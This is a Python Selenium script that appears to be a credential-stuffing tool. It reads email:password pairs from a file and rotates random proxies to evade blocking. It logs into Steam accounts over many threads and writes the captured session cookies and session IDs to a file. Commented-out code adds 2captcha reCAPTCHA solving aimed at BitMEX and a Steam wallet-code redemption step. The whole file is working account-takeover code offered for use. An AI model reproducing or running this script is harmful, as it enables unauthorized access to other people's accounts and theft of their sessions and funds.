from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium.common.exceptions import TimeoutException
import requests; import re
from BeautifulSoup import BeautifulSoup
from lxml.html import fromstring
from urlparse import urlparse
from urlparse import urljoin
import urllib2
import json
import random
import time
import socket
import unicodedata
from win32process import CREATE_NO_WINDOW
import threading
import sys, os
class StoppableThread():
    """Thread class with a stop() method. The thread itself has to check
    regularly for the stopped() condition."""
    threading.current_thread()._stop_event = threading.Event()

    def stop():
        threading.current_thread()._stop_event.set()

    def stopped():
        return threading.current_thread()._stop_event.is_set()

def is_bad_proxy(pip):    
    try:
        socket.setdefaulttimeout(5)
        proxy_handler = urllib2.ProxyHandler({'https': pip})
        opener = urllib2.build_opener(proxy_handler)
        opener.addheaders = [('User-agent', 'Mozilla/5.0')]
        urllib2.install_opener(opener)
        req=urllib2.Request('https://www.bitmex.com')  # change the URL to test here
        sock=urllib2.urlopen(req)
    except urllib2.HTTPError, e:
        #print 'Error code: ', e.code
        return e.code
    except Exception, detail:
        #print "ERROR:", detail
        return True
    return False
main_url = []
infile = open('cool_proxies.txt','r')
for line in infile:
    currentProxy = line.strip()
    main_url.append(currentProxy)
    




#driver = webdriver.Chrome()
data="email@email.com:Password"

def checkacc(data,proxy):
    try:
        solver_key = ""
        socket.setdefaulttimeout(120)
        PROXY = proxy
        chrome_options = webdriver.ChromeOptions()
        chrome_options.add_argument('--proxy-server=%s' % PROXY)
        #chrome_options.add_argument('--headless')
        driver = webdriver.Chrome(chrome_options=chrome_options)
        #driver.set_window_position(0, 0)
        #driver.set_window_size(0, 0)
        url="https://store.steampowered.com/login/?redir=account%2Fredeemwalletcode%2F%5D&redir_ssl=1"
        driver.get(url)
        time.sleep(3)
        email = data.split(":")[0]
        password = data.split(":")[1]
        email_f = driver.find_element_by_id('input_username')
        email_f.send_keys(email)
        pw_f = driver.find_element_by_id('input_password')
        pw_f.send_keys(password)
        mainWin = driver.current_window_handle
        driver.find_element_by_xpath("//button[@class='btnv6_blue_hoverfade  btn_medium']").click()
        #driver.switch_to_frame(driver.find_elements_by_tag_name("iframe")[0])
        time.sleep(7)
        #gangnam = driver.find_element_by_xpath("//input[@id='recaptcha-token']")
        #getcodeurl = "http://2captcha.com/in.php?key="+ str(solver_key)+ "&method=userrecaptcha&googlekey=6LfMblIUAAAAACc6TDlrlKsIv4lZ2OWgJFpu3P2J&pageurl=https://www.bitmex.com/login&here=now&invisible=1"
        #testcode = urllib2.urlopen(getcodeurl).read()
        #gc_IDex = testcode.split("|")
        #gc_ID = gc_IDex[1]
        #time.sleep(15)
        #resurl = "http://2captcha.com/res.php?key=" + str(solver_key) + "&action=get&id=" + str(gc_ID)
        #contents = urllib2.urlopen(resurl).read()
        #while "CAPCHA_NOT_READY" in contents:
        #    time.sleep(2)
        #    contents = urllib2.urlopen(resurl).read()
        #print "contents: " + str(contents)
        #link = contents.split("|")
        #print "link: " + str(link)
        #googleresolved = link[1]
        #driver.switch_to_window(mainWin)
        ##gre = driver.find_element_by_xpath("//textarea[@name='g-recaptcha-response']")
        ##gre.send_keys(googleresolved)
        #driver.execute_script("document.getElementById('g-recaptcha-response').innerHTML='"+ str(googleresolved) + "'")
        #driver.execute_script("onCaptchaCallback()")
        #delay = 3
        #myElem = WebDriverWait(driver, delay).until(EC.presence_of_element_located((By.ID, 'css-dark')))
        #print "Page is ready!"
        
        #if "login" not in driver.current_url:
        #    print data + " Works"
        #    zf = threading.current_thread()
        #    driver.quit()
        #    #StoppableThread.stop()
        #else:
        #    #print "acc not working" + data
        #    zf = threading.current_thread()
        #    driver.quit()
        #    #StoppableThread.stop()
        ##print gangnam.get_attribute('value')
        source_html = driver.page_source
        if "retries" in source_html:
            driver.quit()
            checkaccs(data)
            
            
        cookiez = driver.get_cookies()
        
        
        #bytestring = cookiez.encode('utf-8');
        #key_id = driver.find_element_by_id('wallet_code')
        #key_id.send_keys("SBG82-S98D2-AS712")
        #mainWin = driver.current_window_handle
        #driver.find_element_by_xpath("//a[@id='validate_btn']").click()
        #time.sleep(5)
        #cookiez = json.dumps(cookiez[2])
        formatted_cookies = ''
        for name, props in {x['name']: x for x in driver.get_cookies()}.items():
            formatted_cookies += '{}={}; '.format(name, props['value'])
            print(str(formatted_cookies))
        f= open("guru992.txt","a+")
        elem = driver.find_element_by_xpath("//*")
        source_code = elem.get_attribute("outerHTML")
        m = re.findall(r'g_sessionID = "(.*)(?=";)', source_code)
        f.write(str(formatted_cookies) +"~"+ str(json.dumps(m[0])) + "~" +str(PROXY) + "\n")
        
        f.close()
        driver.quit()
        #print(json.dumps(m[0]))
    except Exception as e:
        exc_type, exc_obj, exc_tb = sys.exc_info()
        #print("excepted, retrying" + str(e) + " line number: " + str(exc_tb.tb_lineno))
        driver.quit()
        print(e)
       # checkacc(data,proxy)
    
    
    
    
main_accs = []
newfile = open('accs.txt', 'r')
for line in newfile:
    splitted = line.split(":")
    if len(splitted) == 2:
        main_accs.append(line.strip())


def checkaccs(data):
    #checkacc(data)
    pnum= len(main_url)
    rpn = random.randint(0,pnum-1)
    randomproxy = main_url[rpn]
    while is_bad_proxy(randomproxy):
    #    #print("bad proxy, trying another one")
    #    pnum= len(main_url)
        rpn = random.randint(0,pnum-1)
        randomproxy = main_url[rpn]
    else:
        #print("%s is working" % (randomproxy))
        currentProxy = randomproxy
        #print "Will check data: "  + data 
        checkacc(data,currentProxy)

z=0
accsn = len(main_accs)
#print(accsn)
#print(accsn)
thr = []
while z < accsn:
    atn = threading.active_count()
    acctocheck = main_accs[z]
    if atn<15:
        
        thr.append(threading.Thread(target=checkaccs, args=(acctocheck,)))
        thr[z].start()
        
    
        #print atn
        #print(acctocheck)
    #    thr.append(threading.Thread(target=checkaccs, args=(acctocheck,)))
    #    thr[z].start()
     #   z = z+1
    else:
        atn = threading.active_count()
        continue
    z = z+1
    
    #DemonSlayer
    
    
    
